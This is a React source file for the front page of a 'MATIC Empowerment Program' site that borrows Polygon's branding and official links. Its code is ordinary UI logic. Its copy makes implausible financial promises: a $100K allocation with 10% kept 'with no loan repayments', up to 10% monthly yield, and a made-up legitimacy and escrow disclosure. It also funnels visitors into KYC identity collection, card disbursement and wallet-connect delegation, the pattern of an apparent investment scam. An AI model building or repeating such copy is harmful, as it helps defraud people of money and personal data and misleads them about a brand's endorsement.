/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { ShieldCheck, Coins, ExternalLink, Inbox, Flame, ArrowUpRight, ArrowRight, HelpCircle, Trophy, BookOpen, UserCheck, Shield, CreditCard, Sparkles, TrendingUp } from 'lucide-react';
import Header from './components/Header';
import Hero from './components/Hero';
import HowItWorks from './components/HowItWorks';
import Benefits from './components/Benefits';
import OurMission from './components/OurMission';
import FAQ from './components/FAQ';
import EligibilityKyc from './components/EligibilityKyc';
import GovernmentAgreement from './components/GovernmentAgreement';
import SupportChat from './components/SupportChat';
import AdminPanel from './components/AdminPanel';
import Disbursement from './components/Disbursement';
import ProjectVision from './components/ProjectVision';
import Delegate from './components/Delegate';
import { ApplicationData, KycStep } from './types';

export default function App() {
  const [currentView, setCurrentView] = useState<string>('home');
  const [fundingAmount, setFundingAmount] = useState<number>(100000); // Default to $100K allocation
  const [application, setApplication] = useState<ApplicationData | null>(null);
  const [activeKycStep, setActiveKycStep] = useState<KycStep>(1);

  // Initialize data from localStorage on mount
  useEffect(() => {
    const cachedApp = localStorage.getItem('mep_application_data');
    if (cachedApp) {
      try {
        const parsed = JSON.parse(cachedApp) as ApplicationData;
        setApplication(parsed);
        // If they have an active pending or approved state, default Kyc stepper back to tracker
        if (parsed.status === 'PENDING' || parsed.status === 'APPROVED' || parsed.status === 'REJECTED') {
          setActiveKycStep(parsed.status === 'REJECTED' ? 3 : 5);
        }
      } catch (e) {
        console.error('Error parsing cached application', e);
      }
    }

    const cachedFunding = localStorage.getItem('mep_requested_funding');
    if (cachedFunding) {
      const parsedAmount = parseInt(cachedFunding, 10);
      if (!isNaN(parsedAmount)) {
        setFundingAmount(parsedAmount);
      }
    }
  }, []);

  const handleSetFundingAmount = (amount: number) => {
    setFundingAmount(amount);
    localStorage.setItem('mep_requested_funding', amount.toString());
  };

  const handleUpdateApplication = (app: ApplicationData | null) => {
    setApplication(app);
    if (!app) {
      localStorage.removeItem('mep_application_data');
    } else {
      localStorage.setItem('mep_application_data', JSON.stringify(app));
    }
  };

  // Switch menus
  const handleViewChange = (view: string) => {
    setCurrentView(view);
    
    // Jump scroll to top to simulate page routing
    window.scrollTo({ top: 0, behavior: 'smooth' });

    // Custom view behaviors
    if (view === 'kyc') {
      if (application) {
        setActiveKycStep(application.status === 'REJECTED' ? 3 : 5);
      } else {
        setActiveKycStep(1);
      }
    }
  };

  return (
    <div className="min-h-screen flex flex-col justify-between bg-dark-bg text-gray-200 relative">
      
      {/* Background radial overlays */}
      <div className="glowing-bg-layer"></div>
      <div className="glowing-bg-layer-2"></div>

      {/* Header bar components */}
      <Header 
        currentView={currentView} 
        onViewChange={handleViewChange}
        onOpenSupport={() => {}}
      />

      {/* Main Container */}
      <main className="flex-grow z-10 relative animate-fade-in">
        {currentView !== 'home' && (
          <div className="max-w-7xl mx-auto px-4 sm:px-6 pt-6 pb-2 text-left">
            <button
              onClick={() => handleViewChange('home')}
              className="inline-flex items-center space-x-2.5 px-5 py-3 bg-gradient-to-r from-[#170C3B] to-[#120731] hover:from-[#211252] hover:to-[#170A3D] border-2 border-[#8247E5]/60 hover:border-[#8247E5] rounded-xl text-white font-bold text-xs sm:text-xs tracking-widest uppercase transition-all shadow-[0_5px_15px_rgba(130,71,229,0.15)] hover:shadow-[0_5px_25px_rgba(130,71,229,0.35)] hover:-translate-y-0.5 active:scale-95 cursor-pointer group"
            >
              <span className="text-[#8247E5] group-hover:text-emerald-400 font-extrabold text-sm sm:text-base transition-colors leading-none">←</span>
              <span>BACK TO MAIN DASHBOARD</span>
            </button>
          </div>
        )}
        {currentView === 'home' && (
          <div className="space-y-16 pb-16">
            <Hero 
              onViewChange={handleViewChange} 
              onSetFundingAmount={handleSetFundingAmount}
              savedAmount={fundingAmount}
            />            {/* SERVING PROGRAM DIRECTORY (MENU) */}
            <div className="max-w-7xl mx-auto px-4 sm:px-6">
              <div className="bg-[#10092c]/95 border-2 border-[#8247E5]/70 rounded-3xl p-6 sm:p-8 shadow-[0_0_60px_rgba(130,71,229,0.35)] space-y-6">
                <div className="flex flex-col md:flex-row justify-between items-start md:items-center border-b border-[#8247E5]/30 pb-5 gap-4">
                  <div className="space-y-1.5 text-left">
                    <h2 className="text-xl sm:text-2xl lg:text-3xl font-display font-black text-white uppercase tracking-tight flex items-center gap-2">
                       <span className="relative flex h-4 w-4 shrink-0">
                         <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-purple-glow opacity-75"></span>
                         <span className="relative inline-flex rounded-full h-4 w-4 bg-[#9F7AEA]"></span>
                       </span>
                       <span className="text-transparent bg-clip-text bg-gradient-to-r from-white via-purple-glow to-blue-400">SERVING PROGRAM DIRECTORY MENU</span>
                    </h2>
                    <p className="text-xs text-gray-300 font-sans">Instantly toggle between live staker credentials, procedural SLA maps, the strategic program roadmap, and credit card disbursement options.</p>
                  </div>
                  <span className="text-[10px] font-mono uppercase bg-purple-brand/20 text-emerald-400 px-3 py-1 rounded border border-emerald-500/25 tracking-widest font-black self-start md:self-auto flex items-center space-x-1.5 shadow-[0_0_15px_rgba(16,185,129,0.15)] shrink-0">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
                    <span>Consolidated Sync Live</span>
                  </span>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6">
                  {[
                    { id: 'how-it-works', label: 'HOW IT WORKS', desc: 'SLA procedural steps, node allocation matrices & validator requirements.', icon: BookOpen, color: 'border-purple-brand/30 hover:border-[#8247E5] bg-[#140b33]/40', pulseColor: 'bg-indigo-400' },
                    { id: 'kyc', label: 'KYC VERIFICATION', desc: 'Secure identity registries, biometric authorization & compliance rosters.', icon: UserCheck, color: 'border-purple-brand/30 hover:border-[#8247E5] bg-[#140b33]/40', pulseColor: 'bg-purple-glow' },
                    { id: 'benefits', label: 'BENEFITS MATRIX', desc: 'Custom core staking node projections and active transaction fee yield rates.', icon: Trophy, color: 'border-purple-brand/30 hover:border-[#8247E5] bg-[#140b33]/40', pulseColor: 'bg-[#3b82f6]' },
                    { id: 'mission', label: 'OUR CORE MISSION', desc: 'Long-term decentralized goals, global validator hardware & network security.', icon: Shield, color: 'border-purple-brand/30 hover:border-[#8247E5] bg-[#140b33]/40', pulseColor: 'bg-[#9f7aea]' },
                    { id: 'disbursement', label: 'PAYCARD & METHODS', desc: 'Physical credit card issuances, certified bank checks & instant loads.', icon: CreditCard, color: 'border-purple-brand/30 hover:border-[#8247E5] bg-[#140b33]/40', pulseColor: 'bg-emerald-400' },
                    { id: 'faq', label: 'POLYGON POOS FAQ', desc: 'Legal clearance indices, escrow regulations & community verification questions.', icon: HelpCircle, color: 'border-purple-brand/30 hover:border-[#8247E5] bg-[#140b33]/40', pulseColor: 'bg-[#f59e0b]' },
                    { id: 'vision', label: 'PROJECT ROADMAP & VISION', desc: 'Strategic bull run goals, heavy ecosystem investments & payment infrastructure.', icon: TrendingUp, color: 'border-purple-brand/50 hover:border-[#9b5de5] bg-[#1e104d] text-[#bfdbfe] font-bold shadow-[0_0_20px_rgba(130,71,229,0.15)]', pulseColor: 'bg-indigo-300' },
                    { id: 'delegate', label: 'DELEGATE & STAKE', desc: 'Connect Web3 dApp wallet directly to authorize MATIC delegation on nodes.', icon: Sparkles, color: 'border-emerald-500/50 hover:border-emerald-300 bg-emerald-500/10 text-emerald-300 font-bold shadow-[0_0_25px_rgba(16,185,129,0.25)]', pulseColor: 'bg-emerald-400' }
                  ].map((portal, idx) => {
                    const TargetIcon = portal.icon;
                    return (
                      <button
                        key={idx}
                        onClick={() => handleViewChange(portal.id)}
                        className={`p-6 sm:p-7 border-2 rounded-2xl text-left flex flex-col justify-between space-y-6 transition-all hover:shadow-[0_12px_35px_rgba(130,71,229,0.35)] hover:-translate-y-1 group active:scale-[0.97] cursor-pointer relative overflow-hidden ${portal.color}`}
                        style={{ minHeight: '190px' }}
                      >
                        {/* Interactive Dimming Ambient Light Overlay */}
                        <div className={`absolute top-0 right-0 w-32 h-32 opacity-10 group-hover:opacity-25 rounded-full blur-3xl pointer-events-none transition-opacity duration-500 ${portal.pulseColor}`}></div>
                        
                        <div className="flex justify-between items-center w-full relative z-10">
                          <div className="p-3 bg-[#8247E5]/15 rounded-2xl text-purple-glow group-hover:bg-[#8247E5] group-hover:text-white transition-all shadow-inner">
                            <TargetIcon className="w-5 h-5" />
                          </div>
                          
                          {/* Pulsing Beacon "Dimming Light" Prompt */}
                          <div className="flex items-center space-x-2 bg-black/40 px-3 py-1.5 rounded-full border border-white/5 shadow-inner">
                            <span className="relative flex h-2 w-2">
                              <span className={`animate-ping absolute inline-flex h-full w-full rounded-full opacity-75 ${portal.pulseColor}`}></span>
                              <span className={`relative inline-flex rounded-full h-2 w-2 ${portal.pulseColor}`}></span>
                            </span>
                            <span className="font-mono text-[9px] text-gray-400 group-hover:text-white transition-colors uppercase font-bold tracking-widest">Active Light</span>
                          </div>
                        </div>
                        
                        <div className="relative z-10 space-y-2.5">
                          <span className="font-display font-black text-xl sm:text-2xl tracking-wide text-white block leading-tight group-hover:text-purple-glow transition-all uppercase drop-shadow">
                            {portal.label}
                          </span>
                          <span className="text-xs text-gray-300 block leading-relaxed font-sans font-medium">
                            {portal.desc}
                          </span>
                        </div>
                      </button>
                    );
                  })}
                </div>
              </div>
            </div>

            {/* In-page landing preview blocks */}
            <div className="max-w-7xl mx-auto px-4 sm:px-6">
              <div className="h-[2px] bg-gradient-to-r from-transparent via-purple-brand/20 to-transparent"></div>
            </div>

            {/* Quick Process Preview */}
            <div className="max-w-7xl mx-auto px-4 sm:px-6 text-center space-y-4">
              <span className="text-[10px] font-mono tracking-widest text-[#2563EB] uppercase">
                Consensus Secured Pools
              </span>
              <h3 className="font-display font-black text-2xl text-white">Sponsoring Node Delegation Globally</h3>
              <p className="text-xs text-gray-400 max-w-lg mx-auto leading-relaxed">
                By participating in the MATIC Empowerment program, you help secure Polygon infrastructure. Review our process flow matrices and begin verification.
              </p>
              
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6 pt-5 max-w-4xl mx-auto">
                <div className="p-4 bg-purple-card/25 border border-purple-brand/10 rounded-xl space-y-1 hover:border-purple-brand/35 transition-colors cursor-pointer" onClick={() => handleViewChange('how-it-works')}>
                  <span className="text-purple-glow font-display font-bold">10% Cash Take-Home</span>
                  <p className="text-xs text-gray-400 mt-1">Kept instantly for yourself to use freely with no loan repayments.</p>
                </div>
                <div className="p-4 bg-purple-card/25 border border-purple-brand/10 rounded-xl space-y-1 hover:border-purple-brand/35 transition-colors cursor-pointer" onClick={() => handleViewChange('how-it-works')}>
                  <span className="text-[#2563EB] font-display font-bold">90% Staked MATIC Core</span>
                  <p className="text-xs text-gray-400 mt-1">Acquired and delegated on premium secure validator nodes.</p>
                </div>
                <div className="p-4 bg-purple-card/25 border border-purple-brand/10 rounded-xl space-y-1 hover:border-purple-brand/35 transition-colors cursor-pointer" onClick={() => handleViewChange('how-it-works')}>
                  <span className="text-emerald-400 font-display font-bold">Up to 10% Monthly yield</span>
                  <p className="text-xs text-gray-400 mt-1">Claim compounding liquid dividends of transactions fee outputs.</p>
                </div>
              </div>
            </div>

          </div>
        )}

        {currentView === 'how-it-works' && <HowItWorks onViewChange={handleViewChange} />}
        {currentView === 'kyc' && (
          <EligibilityKyc 
            application={application} 
            onUpdateApplication={handleUpdateApplication}
            activeStep={activeKycStep}
            onStepChange={setActiveKycStep}
            fundingAmount={fundingAmount}
          />
        )}
         {currentView === 'benefits' && <Benefits onViewChange={handleViewChange} />}
        {currentView === 'legal-agreement' && (
          <GovernmentAgreement 
            application={application} 
            onViewChange={handleViewChange} 
          />
        )}
        {currentView === 'mission' && <OurMission />}
        {currentView === 'faq' && <FAQ />}
        {currentView === 'vision' && <ProjectVision onViewChange={handleViewChange} />}
        {currentView === 'disbursement' && (
          <Disbursement 
            application={application} 
            fundingAmount={fundingAmount} 
            onViewChange={handleViewChange} 
          />
        )}
        {currentView === 'delegate' && (
          <Delegate 
            onViewChange={handleViewChange} 
            savedAmount={fundingAmount} 
          />
        )}
      </main>

      {/* Global Polygon Ecosystem Footer */}
      <footer className="bg-[#04020B] border-t border-purple-brand/20 pt-12 pb-8 px-4 sm:px-6 z-10 relative">
        <div className="max-w-7xl mx-auto space-y-10">
          
          {/* Top row with branding and tags */}
          <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-6 pb-8 border-b border-purple-brand/15">
            <div className="space-y-2.5 text-left max-w-md">
              <div className="flex items-center space-x-2">
                {/* Accurate official Polygon SVG Emblem */}
                <svg 
                  viewBox="0 0 38 38" 
                  fill="none" 
                  className="w-5.5 h-5.5 text-purple-glow" 
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path 
                    d="M30.4 12.835L24.58 9.475V16.2L30.4 19.56a1.114 1.114 0 01.558.966v6.72c0 .403-.215.776-.558.966l-5.82 3.36a1.114 1.114 0 01-1.115 0l-5.82-3.36a1.114 1.114 0 01-.558-.966V20.526l2.316-1.337L15 16.634V9.914a1.114 1.114 0 01.558-.966l5.82-3.36a1.114 1.114 0 011.115 0l5.82 3.36a1.114 1.114 0 01.558.966v2.921h1.529V9.914c0-.792-.423-1.525-1.115-1.898l-5.82-3.36a2.228 2.228 0 00-2.23 0l-5.82 3.36a2.228 2.228 0 00-1.114 1.898v6.72c0 .403.214.776.557.966l5.82 3.36a1.113 1.113 0 01.558.966v6.72c0 .403-.214.776-.558.966l-5.82 3.36a1.114 1.114 0 01-1.115 0l-5.82-3.36c-.343-.2-.558-.564-.558-.966V20.526a1.114 1.114 0 01.558-.966l5.82-3.36a1.114 1.114 0 011.115 0l4.314 2.49V12L9.42 15.166a1.114 1.114 0 01-.558-.966V7.48a1.114 1.114 0 01.558-.966l5.82-3.36a1.114 1.114 0 011.115 0l5.82 3.36a1.114 1.114 0 01.558.966v2.921c0 .792.423 1.525 1.115 1.898l5.82 3.36a2.228 2.228 0 011.114 1.898v6.72c0 .792-.423 1.525-1.114 1.898l-5.82 3.36a2.228 2.228 0 01-2.23 0l-5.82-3.36a2.228 2.228 0 01-1.115-1.898V20.526a2.228 2.228 0 00-1.114-1.898l-5.82-3.36a2.228 2.228 0 00-2.23 0l-5.82 3.36a2.228 2.228 0 00-1.114 1.898V27.246c0 .792.422 1.525 1.114 1.898l5.82 3.36c.692.4 1.538.4 2.23 0l5.82-3.36c.692-.4 1.115-1.133 1.115-1.898V20.526c0-.792-.423-1.525-1.115-1.898l-4.314-2.49V12.835z" 
                    fill="#8247E5" 
                  />
                </svg>
                <span className="font-display font-bold text-white tracking-wide text-lg">MATIC EMPOWERMENT</span>
                <span className="text-[9px] font-mono select-none bg-purple-brand/10 px-1.5 py-0.5 rounded text-purple-glow border border-purple-brand/20 uppercase">
                  Validator Program
                </span>
              </div>
              <p className="text-xs text-gray-400 leading-relaxed font-sans">
                Legally securing the decentralized ledger of the Polygon blockchain ecosystem through sponsored, sovereign human delegation.
              </p>
            </div>

            <div className="flex flex-wrap gap-4 text-xs font-mono">
              <span className="inline-flex items-center space-x-1.5 text-purple-glow">
                <ShieldCheck className="w-4 h-4 text-emerald-400" />
                <span>SSL Cryptographic Escrow</span>
              </span>
              <span className="inline-flex items-center space-x-1.5 text-[#2563EB]">
                <Flame className="w-4 h-4 text-orange-400 animate-pulse" />
                <span>Sandbox Enclave Protection</span>
              </span>
            </div>
          </div>

          {/* Quick Links Quad-Grid */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-8 text-left text-xs font-sans">
            
            {/* Column 1 */}
            <div className="space-y-3">
              <h5 className="font-display font-medium text-[10px] sm:text-xs text-purple-glow uppercase tracking-widest font-mono">
                Polygon Documentation
              </h5>
              <ul className="space-y-2 text-gray-400">
                <li><a href="https://docs.polygon.technology/" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Developer Portal Docs</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://wiki.polygon.technology/" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Polygon PoS Wiki</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://polygon.technology/papers" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Ecosystem Whitepapers</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://github.com/maticnetwork" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Core GitHub Repositories</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
              </ul>
            </div>

            {/* Column 2 */}
            <div className="space-y-3">
              <h5 className="font-display font-medium text-[10px] sm:text-xs text-purple-glow uppercase tracking-widest font-mono">
                Delegated Staking
              </h5>
              <ul className="space-y-2 text-gray-400">
                <li><a href="https://staking.polygon.technology/" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Polygon Staking Portal</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://staking.polygon.technology/validators" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Active Validator Registry</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://polygon.technology/" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>POL Staking Dynamics</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><button onClick={() => { handleViewChange('home'); setTimeout(() => document.getElementById('hero-calculator')?.scrollIntoView({ behavior: 'smooth' }), 100); }} className="hover:text-white text-left font-sans">Staking Yield Calculator</button></li>
              </ul>
            </div>

            {/* Column 3 */}
            <div className="space-y-3">
              <h5 className="font-display font-medium text-[10px] sm:text-xs text-purple-glow uppercase tracking-widest font-mono">
                Scaling Solutions
              </h5>
              <ul className="space-y-2 text-gray-400">
                <li><a href="https://polygon.technology/polygon-zkevm" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Polygon zkEVM</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://polygon.technology/agglayer" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Polygon AggLayer</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://polygon.technology/miden" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Polygon Miden Rollup</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://polygon.technology/" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Polygon ID Sovereign</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
              </ul>
            </div>

            {/* Column 4 */}
            <div className="space-y-3">
              <h5 className="font-display font-medium text-[10px] sm:text-xs text-purple-glow uppercase tracking-widest font-mono">
                Official Community
              </h5>
              <ul className="space-y-2 text-gray-400 font-sans">
                <li><a href="https://twitter.com/0xPolygon" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Twitter/X</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://t.me/polygonofficial" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Telegram</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://discord.com/invite/0xPolygon" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Discord</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
                <li><a href="https://forum.polygon.technology/" target="_blank" rel="noreferrer" className="hover:text-white flex items-center space-x-1"><span>Polygon Forum</span><ArrowUpRight className="w-3 h-3 text-gray-500 shrink-0" /></a></li>
              </ul>
            </div>

          </div>

          {/* Legal Compliance and Treasury Disclosure Footer */}
          <div className="pt-8 border-t border-purple-brand/10 space-y-3.5 text-center text-[10px] text-gray-500 leading-relaxed font-sans max-w-5xl mx-auto">
            <p className="uppercase text-[9px] font-mono text-gray-400 font-semibold tracking-wider">
              Legitimacy and Treasury Disclosure:
            </p>
            <p>
              The MATIC Empowerment Program is an independent community incentive organized under the leadership of accredited delegation validators. Funding provided under this program is facilitated through partner investment networks solely for the delegation of staking resources on the Polygon core POS consensus network. Payout of the 10% cash equivalent is structured specifically to incentivize long-term delegations, and is fully subject to governmental compliance auditing regulations including Form W-9 indices.
            </p>
            <p>
              © {new Date().getFullYear()} MATIC Empowerment Program. All rights reserved. Powered by Polygon validators to scale web3 security.
            </p>
          </div>

        </div>
      </footer>

      {/* Floating interactive virtual chat handler */}
      <SupportChat />

      {/* Floating testing console simulator panel */}
      <AdminPanel 
        application={application} 
        onUpdateApplication={handleUpdateApplication}
        onJumpToStep={setActiveKycStep}
        fundingAmount={fundingAmount}
      />

    </div>
  );
}
